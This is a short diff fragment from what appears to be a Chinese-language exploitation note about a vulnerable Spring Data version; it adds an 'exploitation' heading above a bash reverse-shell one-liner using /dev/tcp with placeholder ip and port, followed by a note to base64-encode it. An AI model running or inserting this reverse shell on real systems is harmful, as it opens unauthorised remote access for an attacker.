@@ -17,7 +17,7 @@ Spring Data release trains < Kay-RC3
 }
 ```
 
-
+漏洞利用
 ```
 bash -i >& /dev/tcp/ip/port 0>&1
 base64一下：
